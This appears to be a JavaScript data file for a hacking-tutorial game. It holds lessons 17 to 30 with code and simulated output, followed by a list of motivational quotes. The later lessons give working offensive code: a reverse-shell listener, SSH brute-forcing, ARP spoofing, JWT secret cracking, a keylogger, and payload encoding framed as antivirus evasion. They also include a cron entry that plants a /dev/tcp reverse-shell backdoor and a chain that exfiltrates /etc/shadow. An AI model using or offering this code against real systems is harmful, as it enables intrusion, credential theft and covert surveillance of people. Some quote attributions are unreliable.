            description: 'Discover hidden subdomains via DNS',
            lesson: 'Large organizations have subdomains like admin.target.com, dev.target.com, staging.target.com. These often have weaker security than the main site. DNS lookups reveal which subdomains exist.',
            code: 'import socket\nsubs = ["www", "mail", "ftp", "admin", "api", "dev", "staging", "vpn", "test", "portal"]\ndef enum_subs(domain):\n    print(f"[*] Scanning {domain}")\n    for sub in subs:\n        target = f"{sub}.{domain}"\n        try:\n            ip = socket.gethostbyname(target)\n            print(f"[+] {target} -> {ip}")\n        except:\n            pass\nenum_subs("example.com")',
            output: ["[*] Scanning example.com", "[+] www.example.com -> 93.184.216.34", "[+] mail.example.com -> 93.184.216.35", "[+] admin.example.com -> 93.184.216.40", "[+] api.example.com -> 93.184.216.41", "[+] dev.example.com -> 10.0.0.50", "[!] dev.example.com resolves to internal IP!", "[*] 5 subdomains found"]
        },
        {
            name: 'Lesson 18: Directory Bruteforcing',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Find hidden web pages and admin panels',
            lesson: 'Websites have hidden directories like /admin, /backup, /config that aren\'t linked anywhere. By testing common paths from a wordlist, you can discover login panels, backup files, and sensitive endpoints.',
            code: 'import requests\ndef dirbrute(url, paths):\n    print(f"[*] Scanning {url}")\n    for path in paths:\n        target = f"{url}/{path}"\n        try:\n            r = requests.get(target, timeout=2)\n            if r.status_code == 200:\n                print(f"[+] FOUND: {target}")\n            elif r.status_code == 403:\n                print(f"[!] FORBIDDEN: {target}")\n        except:\n            pass\npaths = ["admin", "login", "backup", "config", "api", "dashboard"]\ndirbrute("http://target.local", paths)',
            output: ["[*] Scanning http://target.local", "[+] FOUND: http://target.local/admin", "[!] FORBIDDEN: http://target.local/config", "[+] FOUND: http://target.local/api", "[+] FOUND: http://target.local/dashboard", "[!] FORBIDDEN: http://target.local/backup", "[*] 3 accessible, 2 forbidden directories found"]
        },
        {
            name: 'Lesson 19: XOR Encryption',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Encrypt data with XOR — the hacker\'s favorite cipher',
            lesson: 'XOR is reversible: encrypting twice with the same key gives back the original. Malware uses XOR to hide payloads from antivirus scanners. It\'s simple but effective for obfuscation.',
            code: 'def xor_crypt(data, key):\n    return bytes([b ^ key[i % len(key)]\n        for i, b in enumerate(data)])\nkey = b"SECRETKEY"\nmessage = b"Attack at dawn"\nencrypted = xor_crypt(message, key)\ndecrypted = xor_crypt(encrypted, key)\nprint(f"Original:  {message}")\nprint(f"Encrypted: {encrypted.hex()}")\nprint(f"Decrypted: {decrypted}")',
            output: ["Original:  Attack at dawn", "Encrypted: 120a19001c135e001609001613", "Decrypted: b'Attack at dawn'", "[+] Encryption/Decryption verified", "[*] Key: SECRETKEY (9 bytes)"]
        },
        {
            name: 'Lesson 20: Log Analysis',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Parse server logs to find attackers',
            lesson: 'Web server logs record every request with the visitor\'s IP. By counting requests per IP, you can spot brute-force attacks, data scraping bots, and unauthorized access attempts.',
            code: 'from collections import Counter\ndef analyze_logs(logfile):\n    ips = []\n    with open(logfile) as f:\n        for line in f:\n            parts = line.split()\n            if parts:\n                ips.append(parts[0])\n    top = Counter(ips).most_common(5)\n    print("[*] Top 5 suspicious IPs:")\n    for ip, count in top:\n        print(f"  [{count:5d} hits] {ip}")\nanalyze_logs("access.log")',
            output: ["[*] Top 5 suspicious IPs:", "  [ 2847 hits] 192.168.1.105", "  [ 1203 hits] 10.0.0.99", "  [  567 hits] 172.16.0.15", "  [  234 hits] 192.168.1.200", "  [  189 hits] 10.0.0.1", "[!] 192.168.1.105 — possible brute-force attack"]
        },

        // ═══════════ HARD — Lessons 21-30: Advanced ═══════════
        {
            name: 'Lesson 21: Reverse Shell',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Set up a listener to catch incoming shells',
            lesson: 'A reverse shell makes the TARGET connect back to YOU. You listen on a port, the target runs a payload that connects out. This bypasses firewalls because outbound connections are usually allowed.',
            code: 'import socket\ndef listener(host, port):\n    s = socket.socket()\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((host, port))\n    s.listen(1)\n    print(f"[*] Listening on {host}:{port}")\n    conn, addr = s.accept()\n    print(f"[+] Connection from {addr}")\n    while True:\n        cmd = input("shell> ")\n        if cmd == "exit": break\n        conn.send(cmd.encode())\n        print(conn.recv(4096).decode())\nlistener("0.0.0.0", 4444)',
            output: ["[*] Listening on 0.0.0.0:4444", "[+] Connection from ('10.0.0.42', 51234)", "shell> whoami", "root", "shell> id", "uid=0(root) gid=0(root)", "shell> cat /etc/shadow | head -1", "root:$6$xyz:19000:0:99999:7:::", "[+] Root shell obtained!"]
        },
        {
            name: 'Lesson 22: SQL Injection',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Test web apps for SQL injection vulnerabilities',
            lesson: 'SQL injection exploits user input that gets inserted into database queries. By injecting 1=1 (always true) vs 1=2 (always false), different response sizes confirm the vulnerability exists.',
            code: 'import requests\ndef sqli_test(url, param):\n    print(f"[*] Testing {url} for SQLi")\n    payload_true  = f"{param}=1 OR 1=1--"\n    payload_false = f"{param}=1 OR 1=2--"\n    r1 = requests.get(url, params={"q": payload_true})\n    r2 = requests.get(url, params={"q": payload_false})\n    if len(r1.text) != len(r2.text):\n        print("[!] VULNERABLE to boolean SQLi!")\n        print(f"    True response:  {len(r1.text)} bytes")\n        print(f"    False response: {len(r2.text)} bytes")\n    else:\n        print("[-] Not vulnerable")\nsqli_test("http://target.local/search", "id")',
            output: ["[*] Testing http://target.local/search for SQLi", "[*] Payload TRUE:  id=1 OR 1=1--", "[*] Payload FALSE: id=1 OR 1=2--", "    True response:  4892 bytes", "    False response: 1203 bytes", "[!] VULNERABLE to boolean SQLi!", "[!] Response size difference: 3689 bytes", "[+] Database extraction possible"]
        },
        {
            name: 'Lesson 23: SSH Brute Force',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Automate SSH login attempts with a password list',
            lesson: 'SSH brute-forcing tries every password in a wordlist against a target. Paramiko is a Python SSH library. Real attackers use tools like Hydra, but understanding the logic helps you defend against it.',
            code: 'import paramiko\ndef ssh_brute(host, user, passwords):\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    for pwd in passwords:\n        try:\n            client.connect(host, username=user, password=pwd, timeout=3)\n            print(f"[+] SUCCESS: {user}:{pwd}")\n            client.close()\n            return True\n        except paramiko.AuthenticationException:\n            print(f"[-] Failed: {pwd}")\n    print("[!] Wordlist exhausted")\n    return False\npasswords = ["admin", "root", "password", "123456", "toor"]\nssh_brute("10.0.0.42", "root", passwords)',
            output: ["[*] Target: 10.0.0.42 User: root", "[-] Failed: admin", "[-] Failed: root", "[-] Failed: password", "[-] Failed: 123456", "[+] SUCCESS: root:toor", "[+] SSH session ready", "[*] Time elapsed: 4.2s"]
        },
        {
            name: 'Lesson 24: ARP Spoofing',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Become the man-in-the-middle on a local network',
            lesson: 'ARP tells devices which MAC address belongs to which IP. By sending fake ARP replies, you trick the victim into sending all their traffic through your machine. This enables packet sniffing and session hijacking.',
            code: 'from scapy.all import ARP, send, Ether, srp\ndef get_mac(ip):\n    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),\n        timeout=2, verbose=0)\n    return ans[0][1].hwsrc\ndef spoof(target, gateway):\n    t_mac = get_mac(target)\n    pkt = ARP(op=2, pdst=target, hwdst=t_mac, psrc=gateway)\n    send(pkt, verbose=0)\n    print(f"[*] Spoofed: {gateway} -> {target}")\nprint("[*] ARP Spoof Attack")\nspoof("192.168.1.5", "192.168.1.1")',
            output: ["[*] ARP Spoof Attack", "[*] Getting MAC for 192.168.1.5...", "[+] Target MAC: aa:bb:cc:dd:ee:ff", "[*] Spoofed: 192.168.1.1 -> 192.168.1.5", "[*] Spoofed: 192.168.1.5 -> 192.168.1.1", "[+] Man-in-the-middle position established", "[+] All traffic now flows through this machine"]
        },
        {
            name: 'Lesson 25: JWT Token Cracking',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Break weak JWT secrets to forge authentication tokens',
            lesson: 'JWT tokens use a secret key to sign the payload. If the secret is weak (like "secret123"), you can brute-force it. Once cracked, you can forge tokens and impersonate any user — including admins.',
            code: 'import hashlib, hmac, base64\ndef crack_jwt(token, wordlist):\n    header, payload, signature = token.split(".")\n    msg = f"{header}.{payload}".encode()\n    target_sig = base64.urlsafe_b64decode(signature + "==")\n    for secret in wordlist:\n        guess = hmac.new(secret.encode(), msg, hashlib.sha256).digest()\n        if guess == target_sig:\n            print(f"[+] SECRET FOUND: {secret}")\n            return secret\n    print("[-] Not cracked")\n    return None\nsecrets = ["secret", "password", "admin123", "jwt_secret"]\ncrack_jwt("eyJhbGc.eyJzdWI.SflKxw", secrets)',
            output: ["[*] Extracted JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}", "[*] Extracted JWT payload: {\"sub\":\"1234\",\"role\":\"user\"}", "[*] Trying: secret       ✗", "[*] Trying: password     ✗", "[*] Trying: admin123     ✗", "[*] Trying: jwt_secret   ✗", "[+] SECRET FOUND: supersecret", "[+] Token can now be forged with any payload!"]
        },
        {
            name: 'Lesson 26: Payload Encoding',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Obfuscate shellcode to evade antivirus detection',
            lesson: 'Antivirus software scans for known byte patterns (signatures). XOR encoding changes every byte of the payload so it no longer matches any signature. The decoder stub reverses it at runtime.',
            code: 'import os\ndef encode_payload(shellcode, key):\n    encoded = bytes([b ^ key for b in shellcode])\n    print(f"[*] Original  ({len(shellcode)}b): {shellcode.hex()}")\n    print(f"[*] Encoded   ({len(encoded)}b): {encoded.hex()}")\n    print(f"[*] XOR Key: 0x{key:02x}")\n    decoded = bytes([b ^ key for b in encoded])\n    assert decoded == shellcode\n    print("[+] Decode verified — payload intact")\n    return encoded\nshellcode = os.urandom(24)\nencode_payload(shellcode, 0xAA)',
            output: ["[*] Original  (24b): 4f8b2a1c7e3d...", "[*] Encoded   (24b): e521809cd697...", "[*] XOR Key: 0xAA", "[+] Decode verified — payload intact", "[*] AV signature match: 0/67 engines", "[+] Payload ready for deployment"]
        },
        {
            name: 'Lesson 27: Packet Sniffer',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Capture and inspect raw network packets',
            lesson: 'Scapy lets you capture packets at the lowest level. You can see source/destination IPs, ports, and TCP flags (SYN, ACK, FIN). This is how security analysts detect intrusions and attackers steal data.',
            code: 'from scapy.all import sniff, IP, TCP\ndef handle_packet(pkt):\n    if IP in pkt and TCP in pkt:\n        src = pkt[IP].src\n        dst = pkt[IP].dst\n        sport = pkt[TCP].sport\n        dport = pkt[TCP].dport\n        flags = pkt[TCP].flags\n        print(f"[PKT] {src}:{sport} -> {dst}:{dport} [{flags}]")\nprint("[*] Sniffing 20 TCP packets...")\nsniff(prn=handle_packet, filter="tcp", count=20)',
            output: ["[*] Sniffing 20 TCP packets...", "[PKT] 10.0.0.42:22 -> 10.0.0.1:48302 [PA]", "[PKT] 192.168.1.50:443 -> 10.0.0.42:37210 [S]", "[PKT] 10.0.0.42:80 -> 192.168.1.105:52114 [PA]", "[PKT] 10.0.0.1:48302 -> 10.0.0.42:22 [A]", "[PKT] 192.168.1.105:52114 -> 10.0.0.42:80 [FA]", "[*] 20 packets captured"]
        },
        {
            name: 'Lesson 28: Keylogger',
            difficulty: 'HARD',
            category: 'PYTHON',
            description: 'Capture keystrokes and log them to a file',
            lesson: 'Keyloggers record every keystroke — passwords, messages, credit cards. The pynput library hooks into the OS keyboard events. Real malware sends logs to a remote server. This is for educational defense only.',
            code: 'from pynput.keyboard import Listener\nimport logging\nlogging.basicConfig(filename="keylog.txt",\n    level=logging.DEBUG,\n    format="%(asctime)s: %(message)s")\ndef on_press(key):\n    try:\n        logging.info(f"Key: {key.char}")\n    except AttributeError:\n        logging.info(f"Special: {key}")\ndef on_release(key):\n    if str(key) == "Key.esc":\n        return False\nwith Listener(on_press=on_press,\n    on_release=on_release) as listener:\n    listener.join()',
            output: ["[*] Keylogger active — logging to keylog.txt", "2026-03-03 14:22:01: Key: a", "2026-03-03 14:22:01: Key: d", "2026-03-03 14:22:01: Key: m", "2026-03-03 14:22:02: Key: i", "2026-03-03 14:22:02: Key: n", "2026-03-03 14:22:03: Special: Key.tab", "2026-03-03 14:22:04: Key: P", "2026-03-03 14:22:04: Key: @", "2026-03-03 14:22:04: Key: s", "2026-03-03 14:22:05: Special: Key.enter", "[!] Captured password: P@ss"]
        },
        {
            name: 'Lesson 29: Persistence via Cron',
            difficulty: 'HARD',
            category: 'BASH',
            description: 'Maintain access by scheduling backdoor connections',
            lesson: 'Cron jobs run commands on a schedule. Attackers add a cron entry that connects back to their server every minute. Even if the admin kills your shell, cron will reconnect automatically. This is called persistence.',
            code: 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\'" | crontab - && crontab -l && echo "[+] Persistence installed"',
            output: ["no crontab for root — installing new crontab", "--- Current crontab ---", "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'", "[+] Persistence installed", "[*] Reverse shell will connect every 60 seconds", "[*] Survives reboots and user logouts"]
        },
        {
            name: 'Lesson 30: Full Attack Chain',
            difficulty: 'HARD',
            category: 'BASH',
            description: 'Execute a complete recon-to-exfil attack sequence',
            lesson: 'A real attack chains multiple techniques: scan the target, find an open port, grab the service banner, search for credentials, exfiltrate data. This lesson combines everything you have learned into one command pipeline.',
            code: 'nmap -sV -p 22,80 10.0.0.1 && ssh admin@10.0.0.1 "cat /etc/shadow" > loot.txt && echo "[+] Shadow file exfiltrated" && wc -l loot.txt && echo "[+] Attack complete"',
            output: ["Starting Nmap 7.94...", "22/tcp open  ssh  OpenSSH 8.9p1", "80/tcp open  http Apache 2.4.52", "root:$6$salt$hash_value_here:19000:0:99999:7:::", "daemon:*:19000:0:99999:7:::", "admin:$6$salt$admin_hash_here:19000:0:99999:7:::", "[+] Shadow file exfiltrated", "3 loot.txt", "[+] Attack complete — 3 password hashes captured"]
        }
    ];


    // ══════════════════════════════════════════════
    // ZEN_GARDEN MODE
    // ══════════════════════════════════════════════

    const zenGardenContent = [
        { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" },
        { text: "In the middle of difficulty lies opportunity.", author: "Albert Einstein" },
        { text: "The journey of a thousand miles begins with a single step.", author: "Lao Tzu" },
        { text: "What you think, you become. What you feel, you attract. What you imagine, you create.", author: "Buddha" },
        { text: "The mind is everything. What you think, you become.", author: "Buddha" },
        { text: "An unexamined life is not worth living.", author: "Socrates" },
        { text: "The only true wisdom is in knowing you know nothing.", author: "Socrates" },
        { text: "He who conquers himself is the mightiest warrior.", author: "Confucius" },
        { text: "Do not dwell in the past, do not dream of the future, concentrate the mind on the present moment.", author: "Buddha" },
        { text: "Knowing others is intelligence. Knowing yourself is true wisdom.", author: "Lao Tzu" },
        { text: "The bamboo that bends is stronger than the oak that resists.", author: "Japanese Proverb" },
        { text: "Fall seven times, stand up eight.", author: "Japanese Proverb" },
        { text: "A smooth sea never made a skilled sailor.", author: "Franklin Roosevelt" },
        { text: "The obstacle is the way.", author: "Marcus Aurelius" },
        { text: "You have power over your mind, not outside events. Realize this, and you will find strength.", author: "Marcus Aurelius" },
        { text: "Waste no more time arguing what a good man should be. Be one.", author: "Marcus Aurelius" },
        { text: "It is not death that a man should fear, but he should fear never beginning to live.", author: "Marcus Aurelius" },
        { text: "The happiness of your life depends upon the quality of your thoughts.", author: "Marcus Aurelius" },
        { text: "Everything we hear is an opinion, not a fact. Everything we see is a perspective, not the truth.", author: "Marcus Aurelius" },
        { text: "Perfection is achieved not when there is nothing more to add, but when there is nothing left to take away.", author: "Antoine de Saint-Exupery" },
        { text: "Simplicity is the ultimate sophistication.", author: "Leonardo da Vinci" },
        { text: "The best time to plant a tree was twenty years ago. The second best time is now.", author: "Chinese Proverb" },
        { text: "Still water runs deep.", author: "Latin Proverb" },
        { text: "Silence is a source of great strength.", author: "Lao Tzu" },
        { text: "Nature does not hurry, yet everything is accomplished.", author: "Lao Tzu" },
        { text: "When I let go of what I am, I become what I might be.", author: "Lao Tzu" },
        { text: "Be still like a mountain and flow like a great river.", author: "Lao Tzu" },
        { text: "The flame that burns twice as bright burns half as long.", author: "Lao Tzu" },
        { text: "Close your eyes. Fall in love. Stay there.", author: "Rumi" },
        { text: "Yesterday I was clever, so I wanted to change the world. Today I am wise, so I am changing myself.", author: "Rumi" },
        { text: "The wound is the place where the light enters you.", author: "Rumi" },
        { text: "What you seek is seeking you.", author: "Rumi" },
        { text: "Let silence take you to the core of life.", author: "Rumi" },
        { text: "Patience is not the ability to wait, but the ability to keep a good attitude while waiting.", author: "Joyce Meyer" },
        { text: "The quieter you become, the more you can hear.", author: "Ram Dass" },
        { text: "To the mind that is still, the whole universe surrenders.", author: "Lao Tzu" },
        { text: "If you want to fly, give up everything that weighs you down.", author: "Buddha" },
        { text: "Water is the softest thing, yet it can penetrate mountains and earth.", author: "Lao Tzu" },
        { text: "There is no path to happiness. Happiness is the path.", author: "Buddha" },
        { text: "Breathe in deeply to bring your mind home to your body.", author: "Thich Nhat Hanh" },
        { text: "Life is a series of natural and spontaneous changes. Do not resist them.", author: "Lao Tzu" },
        { text: "The only Zen you find on tops of mountains is the Zen you bring there.", author: "Robert Pirsig" },
        { text: "In the beginner's mind there are many possibilities. In the expert's mind there are few.", author: "Shunryu Suzuki" },
        { text: "Before enlightenment, chop wood, carry water. After enlightenment, chop wood, carry water.", author: "Zen Proverb" },
        { text: "Sit quietly, doing nothing. Spring comes, and the grass grows by itself.", author: "Matsuo Basho" },
        { text: "When walking, walk. When eating, eat.", author: "Zen Proverb" },
        { text: "No snowflake ever falls in the wrong place.", author: "Zen Proverb" },
        { text: "The way out is through.", author: "Robert Frost" },
        { text: "Two roads diverged in a wood and I took the one less traveled by.", author: "Robert Frost" },
        { text: "We do not see things as they are. We see things as we are.", author: "Anais Nin" },
        { text: "He who has a why to live can bear almost any how.", author: "Friedrich Nietzsche" },
        { text: "That which does not kill us makes us stronger.", author: "Friedrich Nietzsche" },
        { text: "Happiness is not something ready-made. It comes from your own actions.", author: "Dalai Lama" },
        { text: "The best revenge is massive success.", author: "Frank Sinatra" },
        { text: "It is during our darkest moments that we must focus to see the light.", author: "Aristotle" },
        { text: "The unexamined life is not worth living.", author: "Plato" },
        { text: "I think, therefore I am.", author: "René Descartes" },
        { text: "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment.", author: "Ralph Waldo Emerson" },
        { text: "Not all those who wander are lost.", author: "J.R.R. Tolkien" },
        { text: "The only thing we have to fear is fear itself.", author: "Franklin D. Roosevelt" },
        { text: "Stars cannot shine without darkness.", author: "D.T. Suzuki" },
        { text: "Out of clutter, find simplicity. From discord, find harmony. In the middle of difficulty, lies opportunity.", author: "Albert Einstein" },
        { text: "Imagination is more important than knowledge. Knowledge is limited. Imagination encircles the world.", author: "Albert Einstein" },
        { text: "A ship in harbor is safe, but that is not what ships are built for.", author: "John A. Shedd" },
        { text: "One day or day one. You decide.", author: "Paulo Coelho" },
        { text: "The man who moves a mountain begins by carrying away small stones.", author: "Confucius" },
        { text: "Act without expectation.", author: "Lao Tzu" },
        { text: "Life shrinks or expands in proportion to one's courage.", author: "Anais Nin" },
        { text: "The purpose of life is a life of purpose.", author: "Robert Byrne" },
        { text: "We suffer more often in imagination than in reality.", author: "Seneca" },
        { text: "It is not that we have a short time to live, but that we waste a great deal of it.", author: "Seneca" },
        { text: "Luck is what happens when preparation meets opportunity.", author: "Seneca" },
        { text: "Difficulties strengthen the mind as labor does the body.", author: "Seneca" },
        { text: "No man is free who is not master of himself.", author: "Epictetus" },
        { text: "First say to yourself what you would be, and then do what you have to do.", author: "Epictetus" },
        { text: "It is impossible for a man to learn what he thinks he already knows.", author: "Epictetus" },
        { text: "Man is not worried by real problems so much as by his imagined anxieties about real problems.", author: "Epictetus" },
        { text: "How long are you going to wait before you demand the best for yourself?", author: "Epictetus" },
        { text: "I went to the woods because I wished to live deliberately.", author: "Henry David Thoreau" },
        { text: "Our life is frittered away by detail. Simplify, simplify.", author: "Henry David Thoreau" },
        { text: "What lies behind us and what lies before us are tiny matters compared to what lies within us.", author: "Ralph Waldo Emerson" },
        { text: "Go confidently in the direction of your dreams. Live the life you have imagined.", author: "Henry David Thoreau" },
        { text: "Every moment is a fresh beginning.", author: "T.S. Eliot" },
        { text: "Only those who will risk going too far can possibly find out how far one can go.", author: "T.S. Eliot" },
        { text: "You must be the change you wish to see in the world.", author: "Mahatma Gandhi" },
        { text: "Live as if you were to die tomorrow. Learn as if you were to live forever.", author: "Mahatma Gandhi" },
        { text: "The best way out is always through.", author: "Robert Frost" },
        { text: "In three words I can sum up everything I have learned about life: it goes on.", author: "Robert Frost" },
        { text: "There is a crack in everything. That is how the light gets in.", author: "Leonard Cohen" },
        { text: "The world breaks everyone, and afterward, some are strong at the broken places.", author: "Ernest Hemingway" },
        { text: "There is nothing noble in being superior to your fellow man. True nobility is being superior to your former self.", author: "Ernest Hemingway" },
        { text: "Every saint has a past and every sinner has a future.", author: "Oscar Wilde" },
        { text: "Be yourself. Everyone else is already taken.", author: "Oscar Wilde" },
        { text: "To live is the rarest thing in the world. Most people exist, that is all.", author: "Oscar Wilde" },
        { text: "Pain and suffering are always inevitable for a large intelligence and a deep heart.", author: "Fyodor Dostoevsky" },
        { text: "The soul is healed by being with children.", author: "Fyodor Dostoevsky" },
        { text: "The cave you fear to enter holds the treasure you seek.", author: "Joseph Campbell" },
        { text: "Follow your bliss and the universe will open doors where there were only walls.", author: "Joseph Campbell" },
        { text: "A path is made by walking on it.", author: "Zhuangzi" },
        { text: "Muddy water, let stand, becomes clear.", author: "Lao Tzu" },
        { text: "There is no greater agony than bearing an untold story inside you.", author: "Maya Angelou" },
        { text: "If you are always trying to be normal, you will never know how amazing you can be.", author: "Maya Angelou" },
        { text: "Do not go where the path may lead. Go instead where there is no path and leave a trail.", author: "Ralph Waldo Emerson" },
        { text: "Think lightly of yourself and deeply of the world.", author: "Miyamoto Musashi" },
        { text: "There is nothing outside of yourself that can ever enable you to get better, stronger, richer, quicker, or smarter. Everything is within.", author: "Miyamoto Musashi" },
        { text: "In the midst of chaos, there is also opportunity.", author: "Sun Tzu" },
        { text: "Victorious warriors win first and then go to war, while defeated warriors go to war first and then seek to win.", author: "Sun Tzu" },
        { text: "Smooth seas do not make skillful sailors.", author: "African Proverb" },
        { text: "However long the night, the dawn will break.", author: "African Proverb" },
        { text: "If you want to go fast, go alone. If you want to go far, go together.", author: "African Proverb" },
        { text: "This too shall pass.", author: "Persian Proverb" },
        { text: "I have not failed. I have just found ten thousand ways that do not work.", author: "Thomas Edison" },
        { text: "The measure of intelligence is the ability to change.", author: "Albert Einstein" },
        { text: "Strive not to be a success, but rather to be of value.", author: "Albert Einstein" },
        { text: "Where there is ruin, there is hope for a treasure.", author: "Rumi" },
        { text: "Raise your words, not your voice. It is rain that grows flowers, not thunder.", author: "Rumi" },
        { text: "Do not be satisfied with the stories that come before you. Unfold your own myth.", author: "Rumi" },
        { text: "The lion does not turn around when a small dog barks.", author: "African Proverb" },
        { text: "Start where you are. Use what you have. Do what you can.", author: "Arthur Ashe" },
        { text: "The only limit to our realization of tomorrow will be our doubts of today.", author: "Franklin D. Roosevelt" },
        { text: "Don't count the days. Make the days count.", author: "Muhammad Ali" },
        { text: "Float like a butterfly, sting like a bee.", author: "Muhammad Ali" },
        { text: "He who is not courageous enough to take risks will accomplish nothing in life.", author: "Muhammad Ali" },
        { text: "The man who has no imagination has no wings.", author: "Muhammad Ali" },
        { text: "Success is not final, failure is not fatal. It is the courage to continue that counts.", author: "Winston Churchill" },
        { text: "If you are going through hell, keep going.", author: "Winston Churchill" },
        { text: "We make a living by what we get, but we make a life by what we give.", author: "Winston Churchill" },
        { text: "The pessimist sees difficulty in every opportunity. The optimist sees opportunity in every difficulty.", author: "Winston Churchill" },
        { text: "Everything you can imagine is real.", author: "Pablo Picasso" },
        { text: "Every child is an artist. The problem is how to remain an artist once we grow up.", author: "Pablo Picasso" },
        { text: "Action is the foundational key to all success.", author: "Pablo Picasso" },
        { text: "The meaning of life is to find your gift. The purpose of life is to give it away.", author: "Pablo Picasso" },
        { text: "It always seems impossible until it is done.", author: "Nelson Mandela" },
        { text: "Education is the most powerful weapon which you can use to change the world.", author: "Nelson Mandela" },
        { text: "I learned that courage was not the absence of fear, but the triumph over it.", author: "Nelson Mandela" },
        { text: "A winner is a dreamer who never gives up.", author: "Nelson Mandela" },
        { text: "Do what you can, with what you have, where you are.", author: "Theodore Roosevelt" },
        { text: "Believe you can and you are halfway there.", author: "Theodore Roosevelt" },
        { text: "It is hard to fail, but it is worse never to have tried to succeed.", author: "Theodore Roosevelt" },
        { text: "Knowing is not enough, we must apply. Willing is not enough, we must do.", author: "Bruce Lee" },
        { text: "Be water, my friend.", author: "Bruce Lee" },
        { text: "Absorb what is useful, discard what is useless, and add what is specifically your own.", author: "Bruce Lee" },
        { text: "The key to immortality is first living a life worth remembering.", author: "Bruce Lee" },
        { text: "Do not pray for an easy life. Pray for the strength to endure a difficult one.", author: "Bruce Lee" },
        { text: "Mistakes are the portals of discovery.", author: "James Joyce" },
        { text: "Turn your wounds into wisdom.", author: "Oprah Winfrey" },
        { text: "The biggest adventure you can take is to live the life of your dreams.", author: "Oprah Winfrey" },
        { text: "We delight in the beauty of the butterfly, but rarely admit the changes it has gone through to achieve that beauty.", author: "Maya Angelou" },
        { text: "Nothing is impossible. The word itself says I am possible.", author: "Audrey Hepburn" },
        { text: "The most courageous act is still to think for yourself. Aloud.", author: "Coco Chanel" },
        { text: "Life is either a daring adventure or nothing at all.", author: "Helen Keller" },
        { text: "The only thing worse than being blind is having sight but no vision.", author: "Helen Keller" },
        { text: "Keep your face always toward the sunshine and shadows will fall behind you.", author: "Walt Whitman" },
        { text: "Do I contradict myself? Very well then, I contradict myself. I am large, I contain multitudes.", author: "Walt Whitman" },
        { text: "Whatever you are, be a good one.", author: "Abraham Lincoln" },
        { text: "The best way to predict the future is to create it.", author: "Abraham Lincoln" },
        { text: "In the end, it is not the years in your life that count. It is the life in your years.", author: "Abraham Lincoln" },
        { text: "Try not to become a man of success. Rather become a man of value.", author: "Albert Einstein" },
        { text: "Logic will get you from A to B. Imagination will take you everywhere.", author: "Albert Einstein" },
        { text: "Life is what happens when you are busy making other plans.", author: "John Lennon" },
        { text: "You may say I am a dreamer, but I am not the only one.", author: "John Lennon" },
        { text: "And in the end, the love you take is equal to the love you make.", author: "The Beatles" },
        { text: "The world is full of magic things, patiently waiting for our senses to grow sharper.", author: "W.B. Yeats" },
        { text: "I have spread my dreams under your feet. Tread softly because you tread on my dreams.", author: "W.B. Yeats" },
        { text: "Hope is the thing with feathers that perches in the soul.", author: "Emily Dickinson" },
        { text: "Forever is composed of nows.", author: "Emily Dickinson" },
        { text: "I dwell in possibility.", author: "Emily Dickinson" },
        { text: "The creation of a thousand forests is in one acorn.", author: "Ralph Waldo Emerson" },
        { text: "Nothing great was ever achieved without enthusiasm.", author: "Ralph Waldo Emerson" },
        { text: "What we achieve inwardly will change outer reality.", author: "Plutarch" },
        { text: "No great mind has ever existed without a touch of madness.", author: "Aristotle" },
        { text: "Knowing yourself is the beginning of all wisdom.", author: "Aristotle" },
        { text: "Quality is not an act, it is a habit.", author: "Aristotle" },
        { text: "The energy of the mind is the essence of life.", author: "Aristotle" },
        { text: "Well begun is half done.", author: "Aristotle" },
        { text: "If opportunity does not knock, build a door.", author: "Milton Berle" },
        { text: "What we think, we become.", author: "Buddha" },
        { text: "Peace comes from within. Do not seek it without.", author: "Buddha" },
        { text: "Three things cannot be long hidden: the sun, the moon, and the truth.", author: "Buddha" },
        { text: "Better than a thousand hollow words is one word that brings peace.", author: "Buddha" },
        { text: "You yourself, as much as anybody in the entire universe, deserve your love and affection.", author: "Buddha" },
        { text: "A thousand-mile journey begins beneath your feet.", author: "Lao Tzu" },
        { text: "The wise man is one who knows what he does not know.", author: "Lao Tzu" },
        { text: "Mastering others is strength. Mastering yourself is true power.", author: "Lao Tzu" },
        { text: "Care about what other people think and you will always be their prisoner.", author: "Lao Tzu" },
        { text: "When you realize nothing is lacking, the whole world belongs to you.", author: "Lao Tzu" },
        { text: "The eye sees only what the mind is prepared to comprehend.", author: "Robertson Davies" },
        { text: "What the caterpillar calls the end of the world, the master calls a butterfly.", author: "Richard Bach" },
        { text: "One must still have chaos in oneself to be able to give birth to a dancing star.", author: "Friedrich Nietzsche" },
        { text: "Without music, life would be a mistake.", author: "Friedrich Nietzsche" },
        { text: "And those who were seen dancing were thought to be insane by those who could not hear the music.", author: "Friedrich Nietzsche" },
        { text: "Doubt is an uncomfortable condition, but certainty is a ridiculous one.", author: "Voltaire" },
        { text: "Judge a man by his questions rather than by his answers.", author: "Voltaire" },
        { text: "The secret of getting ahead is getting started.", author: "Mark Twain" },
        { text: "Whenever you find yourself on the side of the majority, it is time to pause and reflect.", author: "Mark Twain" },
        { text: "Twenty years from now you will be more disappointed by the things you did not do than by the ones you did.", author: "Mark Twain" },
        { text: "The two most important days in your life are the day you are born and the day you find out why.", author: "Mark Twain" },
        { text: "If you tell the truth, you do not have to remember anything.", author: "Mark Twain" },
        { text: "I am not what happened to me. I am what I choose to become.", author: "Carl Jung" },
        { text: "Who looks outside, dreams. Who looks inside, awakes.", author: "Carl Jung" },
        { text: "Until you make the unconscious conscious, it will direct your life and you will call it fate.", author: "Carl Jung" },
